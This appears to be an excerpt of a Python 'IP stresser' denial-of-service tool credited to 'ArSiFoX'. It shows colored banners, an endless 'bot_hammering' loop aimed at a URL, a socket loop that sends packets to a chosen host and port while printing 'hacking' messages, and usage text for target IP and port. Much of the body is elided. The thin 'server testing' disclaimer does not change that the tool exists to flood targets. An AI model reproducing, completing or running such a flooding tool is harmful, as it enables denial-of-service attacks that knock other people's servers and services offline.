import time
time.sleep(1)
print("\033[1;31;40mIPStreeser v1.0")
time.sleep(1)
print("\033[1;31;40mMaked by ArSiFoX")
time.sleep(1)
...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94mbot is hacking...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hacking--> \033[0m")
			else:
				s.shutdown(1)
...
def usage():
	print (''' \033[92m	IPStresser by ArSiFoX
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 stresser.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
